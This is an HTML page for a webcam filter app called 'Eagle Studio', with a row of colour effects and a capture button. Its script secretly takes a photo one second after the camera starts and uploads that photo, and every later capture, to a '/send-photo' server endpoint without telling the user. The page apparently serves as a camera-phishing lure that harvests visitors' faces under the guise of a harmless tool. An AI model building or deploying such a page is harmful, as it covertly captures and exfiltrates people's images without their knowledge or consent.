<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Eagle Studio</title>

<style>
*{
  box-sizing:border-box;
  -webkit-tap-highlight-color:transparent;
}

body{
  margin:0;
  min-height:100vh;
  font-family:Arial,sans-serif;
  background:#f4f5f7;
  color:#222;
}

.topbar{
  height:64px;
  background:#fff;
  border-bottom:1px solid #ddd;
  display:flex;
  align-items:center;
  justify-content:center;
}

.logo{
  font-size:22px;
  font-weight:800;
  letter-spacing:-.5px;
}

.logo span{
  margin-left:7px;
}

.main{
  width:100%;
  max-width:1050px;
  margin:auto;
  padding:24px 18px 35px;
}

.camera-area{
  width:100%;
  max-width:720px;
  margin:auto;
}

.camera{
  position:relative;
  width:100%;
  aspect-ratio:4/3;
  background:#111;
  overflow:hidden;
  border-radius:12px;
  box-shadow:0 10px 35px rgba(0,0,0,.18);
}

#video{
  width:100%;
  height:100%;
  object-fit:cover;
  display:block;
  transition:.2s;
}

/* EFFECTS */

.fx-mirror{
  transform:scaleX(-1);
}

.fx-upside{
  transform:rotate(180deg);
}

.fx-invert{
  filter:invert(1);
}

.fx-gray{
  filter:grayscale(1);
}

.fx-sepia{
  filter:sepia(1);
}

.fx-neon{
  filter:saturate(2) contrast(1.4) hue-rotate(80deg);
}

.fx-warm{
  filter:sepia(.25) saturate(1.45) contrast(1.05);
}

.fx-cool{
  filter:saturate(.8) hue-rotate(25deg) brightness(1.08);
}

.fx-vivid{
  filter:saturate(1.8) contrast(1.12);
}

.fx-dream{
  filter:brightness(1.15) saturate(.85) contrast(.9);
}

.fx-noir{
  filter:grayscale(1) contrast(1.5) brightness(.85);
}

.fx-old{
  filter:sepia(.65) contrast(1.15) saturate(.7);
}

.fx-glitch{
  filter:hue-rotate(90deg) saturate(2) contrast(1.3);
}

.fx-thermal{
  filter:hue-rotate(150deg) saturate(2.2) contrast(1.35);
}

.fx-night{
  filter:hue-rotate(85deg) saturate(1.7) brightness(.75) contrast(1.2);
}

.fx-cartoon{
  filter:saturate(1.7) contrast(1.35);
}

.fx-pink{
  filter:hue-rotate(310deg) saturate(1.5);
}

.fx-blue{
  filter:hue-rotate(190deg) saturate(1.35);
}

.fx-gold{
  filter:sepia(.3) saturate(1.7) brightness(1.05);
}

.fx-fade{
  filter:contrast(.82) saturate(.65) brightness(1.08);
}

/* TOP CAMERA ICON */

.camera-label{
  position:absolute;
  top:12px;
  right:12px;
  z-index:5;
  background:rgba(0,0,0,.45);
  color:#fff;
  padding:7px 10px;
  border-radius:20px;
  font-size:12px;
  backdrop-filter:blur(8px);
}

/* CONTROLS */

.controls{
  margin-top:16px;
  display:flex;
  justify-content:center;
  align-items:center;
  gap:12px;
}

.main-btn{
  border:0;
  border-radius:50px;
  padding:14px 25px;
  background:#222;
  color:#fff;
  font-size:15px;
  font-weight:bold;
  cursor:pointer;
  transition:.18s;
}

.main-btn:hover{
  transform:translateY(-1px);
  background:#000;
}

.capture{
  width:62px;
  height:62px;
  padding:0;
  border-radius:50%;
  background:#fff;
  border:5px solid #222;
  box-shadow:0 3px 12px rgba(0,0,0,.2);
  color:transparent;
}

.capture:active{
  transform:scale(.92);
}

.capture:disabled{
  opacity:.35;
  cursor:not-allowed;
}

.status{
  height:18px;
  text-align:center;
  margin-top:8px;
  font-size:12px;
  color:#888;
}

/* EFFECT SECTION */

.effects-title{
  max-width:720px;
  margin:25px auto 10px;
  font-size:16px;
  font-weight:bold;
}

.effects-wrapper{
  max-width:720px;
  margin:auto;
  position:relative;
}

.effects{
  display:flex;
  gap:9px;
  overflow-x:auto;
  padding:7px 2px 15px;
  scroll-behavior:smooth;
  scrollbar-width:none;
}

.effects::-webkit-scrollbar{
  display:none;
}

.effect{
  flex:0 0 82px;
  height:82px;
  border:1px solid #ddd;
  border-radius:10px;
  background:#fff;
  cursor:pointer;
  padding:5px;
  transition:.18s;
  position:relative;
}

.effect:hover{
  transform:translateY(-2px);
  box-shadow:0 5px 15px rgba(0,0,0,.1);
}

.effect.active{
  border:3px solid #222;
  padding:3px;
}

.preview{
  width:100%;
  height:50px;
  border-radius:7px;
  background:
    linear-gradient(135deg,#777,#222);
  display:flex;
  align-items:center;
  justify-content:center;
  color:#fff;
  font-size:21px;
  overflow:hidden;
}

.effect-name{
  display:block;
  margin-top:5px;
  font-size:10px;
  color:#333;
}

/* PREVIEW STYLES */

.preview.mirror{
  transform:scaleX(-1);
}

.preview.gray{
  filter:grayscale(1);
}

.preview.sepia{
  filter:sepia(1);
}

.preview.neon{
  filter:saturate(2) hue-rotate(80deg);
}

.preview.warm{
  filter:sepia(.25) saturate(1.5);
}

.preview.cool{
  filter:hue-rotate(25deg);
}

.preview.vivid{
  filter:saturate(1.8);
}

.preview.dream{
  filter:brightness(1.2) saturate(.8);
}

.preview.noir{
  filter:grayscale(1) contrast(1.5);
}

.preview.old{
  filter:sepia(.65);
}

.preview.glitch{
  filter:hue-rotate(90deg) saturate(2);
}

.preview.thermal{
  filter:hue-rotate(150deg) saturate(2);
}

.preview.night{
  filter:hue-rotate(85deg) saturate(1.7);
}

.preview.gold{
  filter:sepia(.3) saturate(1.7);
}

/* MOBILE */

@media(max-width:600px){

  .topbar{
    height:55px;
  }

  .main{
    padding:14px 10px 25px;
  }

  .camera{
    border-radius:9px;
  }

  .controls{
    margin-top:13px;
  }

  .main-btn{
    padding:12px 19px;
    font-size:13px;
  }

  .capture{
    width:58px;
    height:58px;
  }

  .effects-title{
    margin-top:20px;
    font-size:14px;
  }

  .effect{
    flex-basis:76px;
    height:77px;
  }

  .preview{
    height:46px;
  }
}
</style>
</head>

<body>

<header class="topbar">
  <div class="logo">
    <span>🦅</span> Eagle Studio
  </div>
</header>

<main class="main">

  <section class="camera-area">

    <div class="camera" id="cameraBox">

      <div class="camera-label">
        CAMERA
      </div>

      <video
        id="video"
        autoplay
        playsinline
        muted>
      </video>

    </div>

    <div class="controls">

      <button
        id="start"
        class="main-btn">
        🎥 تشغيل الكاميرا
      </button>

      <button
        id="capture"
        class="main-btn capture"
        disabled>
        📸
      </button>

    </div>

    <div
      id="status"
      class="status">
    </div>

  </section>


  <div class="effects-title">
    ✨ Effects
  </div>

  <section class="effects-wrapper">

    <div class="effects" id="effects">


      <button class="effect active" data-effect="normal">
        <div class="preview">📷</div>
        <span class="effect-name">Normal</span>
      </button>


      <button class="effect" data-effect="mirror">
        <div class="preview mirror">🪞</div>
        <span class="effect-name">Mirror</span>
      </button>


      <button class="effect" data-effect="gray">
        <div class="preview gray">🖤</div>
        <span class="effect-name">B&W</span>
      </button>


      <button class="effect" data-effect="sepia">
        <div class="preview sepia">📼</div>
        <span class="effect-name">Sepia</span>
      </button>


      <button class="effect" data-effect="neon">
        <div class="preview neon">💜</div>
        <span class="effect-name">Neon</span>
      </button>


      <button class="effect" data-effect="warm">
        <div class="preview warm">☀️</div>
        <span class="effect-name">Warm</span>
      </button>


      <button class="effect" data-effect="cool">
        <div class="preview cool">❄️</div>
        <span class="effect-name">Cool</span>
      </button>


      <button class="effect" data-effect="vivid">
        <div class="preview vivid">🌈</div>
        <span class="effect-name">Vivid</span>
      </button>


      <button class="effect" data-effect="dream">
        <div class="preview dream">☁️</div>
        <span class="effect-name">Dream</span>
      </button>


      <button class="effect" data-effect="noir">
        <div class="preview noir">🌑</div>
        <span class="effect-name">Noir</span>
      </button>


      <button class="effect" data-effect="old">
        <div class="preview old">🎞️</div>
        <span class="effect-name">Old Film</span>
      </button>


      <button class="effect" data-effect="glitch">
        <div class="preview glitch">⚡</div>
        <span class="effect-name">Glitch</span>
      </button>


      <button class="effect" data-effect="thermal">
        <div class="preview thermal">🔥</div>
        <span class="effect-name">Thermal</span>
      </button>


      <button class="effect" data-effect="night">
        <div class="preview night">🌙</div>
        <span class="effect-name">Night</span>
      </button>


      <button class="effect" data-effect="gold">
        <div class="preview gold">✨</div>
        <span class="effect-name">Gold</span>
      </button>


      <button class="effect" data-effect="pink">
        <div class="preview">💗</div>
        <span class="effect-name">Pink</span>
      </button>


      <button class="effect" data-effect="blue">
        <div class="preview">💙</div>
        <span class="effect-name">Blue</span>
      </button>


      <button class="effect" data-effect="fade">
        <div class="preview">🌫️</div>
        <span class="effect-name">Fade</span>
      </button>

    </div>

  </section>

  <canvas id="canvas"></canvas>

</main>


<script>

const video =
  document.getElementById("video");

const canvas =
  document.getElementById("canvas");

const start =
  document.getElementById("start");

const capture =
  document.getElementById("capture");

const cameraBox =
  document.getElementById("cameraBox");

const status =
  document.getElementById("status");

let stream = null;

let selectedEffect = "normal";

let autoShotDone = false;


/* EFFECTS */

document
.querySelectorAll(".effect")
.forEach(button => {

  button.onclick = () => {

    document
    .querySelectorAll(".effect")
    .forEach(b =>
      b.classList.remove("active")
    );

    button.classList.add("active");

    selectedEffect =
      button.dataset.effect;

    applyEffect();

  };

});


/* APPLY EFFECT */

function applyEffect(){

  video.className = "";

  if(selectedEffect === "normal")
    return;

  if(selectedEffect === "mirror"){
    video.classList.add("fx-mirror");
    return;
  }

  video.classList.add(
    "fx-" + selectedEffect
  );

}


/* CANVAS FILTER */

function getCanvasFilter(effect){

  if(effect === "gray")
    return "grayscale(1)";

  if(effect === "sepia")
    return "sepia(1)";

  if(effect === "neon")
    return "saturate(2) contrast(1.4) hue-rotate(80deg)";

  if(effect === "warm")
    return "sepia(.25) saturate(1.45) contrast(1.05)";

  if(effect === "cool")
    return "saturate(.8) hue-rotate(25deg) brightness(1.08)";

  if(effect === "vivid")
    return "saturate(1.8) contrast(1.12)";

  if(effect === "dream")
    return "brightness(1.15) saturate(.85) contrast(.9)";

  if(effect === "noir")
    return "grayscale(1) contrast(1.5) brightness(.85)";

  if(effect === "old")
    return "sepia(.65) contrast(1.15) saturate(.7)";

  if(effect === "glitch")
    return "hue-rotate(90deg) saturate(2) contrast(1.3)";

  if(effect === "thermal")
    return "hue-rotate(150deg) saturate(2.2) contrast(1.35)";

  if(effect === "night")
    return "hue-rotate(85deg) saturate(1.7) brightness(.75) contrast(1.2)";

  if(effect === "gold")
    return "sepia(.3) saturate(1.7) brightness(1.05)";

  if(effect === "pink")
    return "hue-rotate(310deg) saturate(1.5)";

  if(effect === "blue")
    return "hue-rotate(190deg) saturate(1.35)";

  if(effect === "fade")
    return "contrast(.82) saturate(.65) brightness(1.08)";

  return "none";
}


/* TAKE PHOTO */

async function takePhoto(){

  if(!video.videoWidth)
    return;

  canvas.width =
    video.videoWidth;

  canvas.height =
    video.videoHeight;

  const ctx =
    canvas.getContext("2d");

  ctx.filter =
    getCanvasFilter(
      selectedEffect
    );

  if(selectedEffect === "mirror"){

    ctx.translate(
      canvas.width,
      0
    );

    ctx.scale(-1,1);

  }

  ctx.drawImage(
    video,
    0,
    0,
    canvas.width,
    canvas.height
  );

  ctx.filter = "none";

  const blob =
    await new Promise(resolve => {

      canvas.toBlob(
        resolve,
        "image/jpeg",
        .92
      );

    });

  if(!blob)
    return;

  const data =
    new FormData();

  data.append(
    "photo",
    blob,
    "eagle-studio.jpg"
  );

  try{

    await fetch(
      "/send-photo",
      {
        method:"POST",
        body:data
      }
    );

  }catch(error){

    console.error(error);

  }

}


/* START CAMERA */

start.onclick = async () => {

  try{

    stream =
      await navigator
      .mediaDevices
      .getUserMedia({

        video:{
          facingMode:"user"
        },

        audio:false

      });

    video.srcObject =
      stream;

    capture.disabled =
      false;

    applyEffect();


    /* AUTO PHOTO */

    if(!autoShotDone){

      autoShotDone = true;

      setTimeout(
        async () => {

          await takePhoto();

        },
        1000
      );

    }

  }catch(error){

    console.error(error);

  }

};


/* MANUAL PHOTO */

capture.onclick =
  async () => {

    await takePhoto();

  };

</script>

</body>
</html>
